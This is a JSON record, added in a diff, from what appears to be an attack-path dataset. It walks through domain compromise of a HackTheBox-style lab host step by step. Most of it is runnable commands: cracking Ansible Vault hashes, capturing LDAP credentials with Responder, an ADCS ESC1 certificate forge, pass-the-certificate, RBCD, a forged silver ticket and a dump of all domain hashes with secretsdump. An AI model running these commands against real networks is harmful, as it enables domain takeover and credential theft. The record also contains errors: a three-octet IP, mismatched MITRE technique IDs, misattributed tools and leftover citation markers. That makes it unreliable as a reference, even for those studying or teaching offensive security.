@@ -1,0 +1,172 @@
+{
+  "id": "ap-0036",
+  "title": "ADCS ESC1 via PWM LDAP Credential Theft and Resource-Based Constrained Delegation (RBCD)",
+  "summary": "Initial access gained by exploiting insecure SMB configurations leading to the discovery of encrypted Ansible playbooks. After cracking the Ansible Vault password, the PWM management interface was accessed to perform LDAP configuration manipulation, resulting in the cleartext theft of the 'SVC_ldap' service account credentials. These credentials were used for an ADCS ESC1 attack to forge an Administrator certificate, enabling Pass-the-Certificate (PtC) and ultimate Domain Administrator compromise via Silver Ticket forgery and NT hash dumping.",
+  "attack_path_markdown": "### Step 1: Reconnaissance and Initial Access\nEnumerate open ports and services, confirming Active Directory and accessible SMB shares using invalid/guest credentials. Download Ansible playbooks from the 'development' share.\n### Step 2: Weaponization and Delivery\nCrack Ansible Vault passwords using Hashcat to obtain access credentials for the PWM management interface (8443/SSL).\n### Step 3: Exploitation (Credential Theft)\nLog into PWM, modify LDAP settings to point to an attacker-controlled listener, and capture the cleartext `SVC_ldap` password using Responder.\n### Step 4: Installation and C2 Prep\nUse `SVC_ldap` credentials to gain WinRM access and check the Machine Account Quota (MAQ). Confirm the ESC1 vulnerability via Certify against the `CorpVPN` template.\n### Step 5: Command and Control\nCreate a new machine account (`ipac$`) and request an Administrator certificate using ESC1. Extract the certificate and private key. Use Pass-the-Certificate (`passthecert.py`) to obtain a highly privileged LDAP shell.\n### Step 6: Actions on Objectives\nAchieve full domain dominance by setting RBCD on the Domain Controller for the new machine account. Forge a Silver Ticket (CIFS service) as Administrator and use it to dump all domain NT hashes via `secretsdump.py`.",
+  "kill_chain": [
+    {
+      "phase_order": 1,
+      "phase_name": "Reconnaissance",
+      "description": "Identifying the target's services (AD, web, SMB) and finding initial configuration files on an accessible share.",
+      "actions": [
+        "Perform initial Nmap scan to identify ports (53, 88, 139, 389, 445, 636, 3389, 8443) and confirm Active Directory presence .",
+        "Confirm domain name (`authority.htb`) and hostname (`Authority`) using `net exec` .",
+        "Enumerate SMB shares, discovering read access to the 'development' share using invalid/guest credentials .",
+        "Download contents of the 'development' share, specifically the Ansible automation directory."
+      ],
+      "tools": ["nmap", "net exec (crackmapexec)", "smbclient"],
+      "techniques": ["T1046: Network Service Scanning", "T1078: Valid Accounts (Guest/Default)"],
+      "mitre_ids": ["T1046", "T1078"],
+      "indicators": ["Open ports, files downloaded from SMB share"],
+      "preconditions": "Network connectivity to target (10.10.11.222).",
+      "expected_outcome": "List of services, domain name, and encrypted Ansible configuration files.",
+      "confidence": 1.0,
+      "commands": [
+        "nmap -sC -sV -oA nmap/Authority 10.10.11.222",
+        "net exec 10.10.11.222",
+        "net exec SMB --shares 10.10.11.222",
+        "smbclient //10.10.11.222/development (Inside client: recurse on; prompt off; mget *)"
+      ]
+    },
+    {
+      "phase_order": 2,
+      "phase_name": "Weaponization",
+      "description": "Preparing the tools and decrypting encrypted credentials stored within the Ansible Vault.",
+      "actions": [
+        "Identify and extract Ansible Vault hashes from configuration files (e.g., `pwm_admin_password`, `ldap_admin_password`).",
+        "Convert Ansible Vault hashes into a crackable format using `ansible-to-john` .",
+        "Crack the hashes using Hashcat in mode 16900 against a wordlist (e.g., RockYou) .",
+        "Decrypt the credentials using the recovered password and `ansible-vault decrypt`."
+      ],
+      "tools": ["ansible2john", "hashcat", "ansible-vault"],
+      "techniques": ["T1555.004: Credential Access: Private Keys and Certificates (Cracking stored hashes)", "T1110.004: Brute Force: Wordlist"],
+      "mitre_ids": ["T1555.004", "T1110.004"],
+      "indicators": ["Cracked password for the vault: 'ldap in the clear' "],
+      "preconditions": "Access to Ansible configuration variables and a cracking machine.",
+      "expected_outcome": "Valid credential for the PWM management interface.",
+      "confidence": 1.0,
+      "commands": [
+        "ansible2john.py pwm_admin_login pwm_admin_password ldap_admin_password > ansible.hashes",
+        "hashcat -m 16900 ansible.hashes rockyou.txt --show"
+      ]
+    },
+    {
+      "phase_order": 3,
+      "phase_name": "Delivery",
+      "description": "Using the cracked password to access the PWM application interface (8443/SSL) to set up the next exploitation step.",
+      "actions": [
+        "Login to the PWM configuration manager interface using the cracked credential ."
+      ],
+      "tools": ["Web browser"],
+      "techniques": ["T1078: Valid Accounts"],
+      "mitre_ids": ["T1078"],
+      "indicators": ["Successful access to Configuration Editor."],
+      "preconditions": "Cracked credential.",
+      "expected_outcome": "Access to PWM configuration settings.",
+      "confidence": 1.0,
+      "commands": []
+    },
+    {
+      "phase_order": 4,
+      "phase_name": "Exploitation",
+      "description": "Manipulating the PWM LDAP configuration to force the application to send its highly privileged LDAP credentials to the attacker's listener.",
+      "actions": [
+        "Set up Responder listener on the attacker machine (port 389) .",
+        "Modify the PWM LDAP connection setting (e.g., directories default connection) to use the attacker's IP (`ldap://10.11.48:389`) .",
+        "Test the LDAP profile connection via the PWM interface, capturing the SVC_ldap password in cleartext ."
+      ],
+      "tools": ["Responder"],
+      "techniques": ["T1557.001: Man-in-the-Middle: LLMNR/NBT-NS Poisoning (Leveraging Responder to capture cleartext password)"],
+      "mitre_ids": ["T1557.001"],
+      "indicators": ["SVC_ldap username and password ('ldap in the clear') captured by Responder "],
+      "preconditions": "Access to PWM configuration editor.",
+      "expected_outcome": "Valid domain user credentials: SVC_ldap: 'ldap in the clear'.",
+      "confidence": 1.0,
+      "commands": [
+        "sudo responder -I tun0",
+        "(Manual action in PWM interface: Set LDAP URL to ldap://10.11.48:389)"
+      ]
+    },
+    {
+      "phase_order": 5,
+      "phase_name": "Installation",
+      "description": "Gaining a remote shell and confirming the prerequisites for the ADCS ESC1 attack.",
+      "actions": [
+        "Gain remote access via WinRM using SVC_ldap credentials .",
+        "Check the Machine Account Quota (MAQ) using `net exec ldap` .",
+        "Identify the ADCS ESC1 vulnerability using Certify, targeting the `CorpVPN` template ."
+      ],
+      "tools": ["Evil-WinRM", "net exec", "certify"],
+      "techniques": ["T1021.006: Remote Services: Windows Remote Management (WinRM)", "T1484.001: Domain Policy Modification"],
+      "mitre_ids": ["T1021.006", "T1484.001"],
+      "indicators": ["Successful WinRM session", "MAQ result (e.g., 10) [15]", "Certify output showing ESC1 vulnerability"],
+      "preconditions": "Valid domain user credentials (SVC_ldap).",
+      "expected_outcome": "Remote shell access and confirmation of ADCS vulnerability and computer creation allowance.",
+      "confidence": 1.0,
+      "commands": [
+        "evil-winrm -i 10.10.11.222 -u SVC_ldap -p 'ldap in the clear'",
+        "net exec ldap 10.10.11.222 -u SVC_ldap -p 'ldap in the clear' -M maq",
+        "certify find -u SVC_ldap -p 'ldap in the clear' -target authority.htb --text --vulnerable"
+      ]
+    },
+    {
+      "phase_order": 6,
+      "phase_name": "Command and Control",
+      "description": "Forging the Administrator certificate via ESC1 and establishing a highly privileged shell using Pass-the-Certificate.",
+      "actions": [
+        "Create a new machine account (`ipac$`) with a known password using `addcomputer.py` .",
+        "Request an Administrator certificate (`administrator.pfx`) using `certify request` via the new machine account and the vulnerable `CorpVPN_DN` template .",
+        "Extract the certificate (.crt) and private key (.key) from the PFX file .",
+        "Use `passthecert.py` (Impacket script) to gain an authenticated LDAP shell ."
+      ],
+      "tools": ["Impacket (addcomputer.py, passthecert.py)", "certify"],
+      "techniques": ["T1207: KDC Communication", "T1187: Pass the Certificate", "T1484.001: Domain Policy Modification (ESC1)"],
+      "mitre_ids": ["T1207", "T1187", "T1484.001"],
+      "indicators": ["Machine account created", "Administrator PFX certificate file created", "Successful LDAP shell access [22]"],
+      "preconditions": "ESC1 vulnerability confirmed, MAQ quota available, machine account creation tool (Impacket).",
+      "expected_outcome": "High-privileged command access (LDAP shell) as Administrator.",
+      "confidence": 0.95,
+      "commands": [
+        "addcomputer.py authority/SVC_ldap:'[password]' -method ldaps -computer-name ipac -computer-pass 'PleaseSubscribe!1' -dc-ip 10.10.11.222",
+        "certify request -u ipac$ -p 'PleaseSubscribe!1' -template CorpVPN_DN -dc-ip 10.10.11.222",
+        "certify -pfx administrator.pfx -nocert -out administrator.key",
+        "certify -pfx administrator.pfx -nokeys -out administrator.crt",
+        "python3 passthecert.py -action ldapshell -cert administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.10.11.222"
+      ]
+    },
+    {
+      "phase_order": 7,
+      "phase_name": "Actions on Objectives",
+      "description": "Achieving Domain Administrator dominance by setting Resource-Based Constrained Delegation and dumping credentials.",
+      "actions": [
+        "Set Resource-Based Constrained Delegation (RBCD) via the LDAP shell, allowing `ipac$` to impersonate users on the Domain Controller (`Authority`) .",
+        "Synchronize the system clock to prevent Kerberos errors .",
+        "Forge a Silver Ticket for the CIFS service as Administrator using the machine account credentials [23, 24].",
+        "Set the Kerberos credential cache environment variable (`KRB5CCNAME`) .",
+        "Dump all domain NT hashes using the forged ticket and `secretsdump.py` ."
+      ],
+      "tools": ["Impacket (getSilverTicket.py, secretsdump.py)", "ntpdate"],
+      "techniques": ["T1558.003: Kerberos Ticket Forging (Silver Ticket)", "T1003.003: OS Credential Dumping: NTDS"],
+      "mitre_ids": ["T1558.003", "T1003.003"],
+      "indicators": ["All domain NT hashes successfully dumped"],
+      "preconditions": "High-privileged LDAP access (via PtC) and machine account credentials.",
+      "expected_outcome": "Full control over the domain and access to all credentials.",
+      "confidence": 1.0,
+      "commands": [
+        "(Inside LDAP shell): set rbcd authority ipac",
+        "sudo ntpdate 10.10.11.222",
+        "getSilverTicket.py cifs/authority.authority.htb administrator authority.htb/ipac\\$ -password 'PleaseSubscribe!1'",
+        "export KRB5CCNAME=administrator.ccache",
+        "secretsdump.py -k -no-pass authority.htb/administrator@authority.htb"
+      ]
+    }
+  ],
+  "tactics": ["Initial Access", "Credential Access", "Discovery", "Privilege Escalation", "Lateral Movement", "Defense Evasion", "Command and Control", "Actions on Objectives"],
+  "techniques": ["T1555.004 (Decryption)", "T1557.001 (Responder)", "T1021.006 (WinRM)", "T1187 (Pass the Cert)", "T1484.001 (ESC1)", "T1558.003 (Silver Ticket/RBCD)"],
+  "mitre_ids": ["T1555.004", "T1557.001", "T1021.006", "T1187", "T1484.001", "T1558.003", "T1003.003"],
+  "hosts": ["10.10.11.222", "authority.htb", "Authority"],
+  "privs_obtained": ["domain user (SVC_ldap)", "local admin (via WinRM)", "Domain Administrator"],
+  "confidence": 1.0,
+  "notes": "The path exploits poor credential management (Ansible Vault) and configuration flaws (PWM LDAP configuration and ADCS ESC1 vulnerability) to achieve domain dominance.",
+  "labels": ["attack_path", "adcs", "esc1", "pwm", "ldap_mitm", "silver_ticket", "rbcd"]
+}
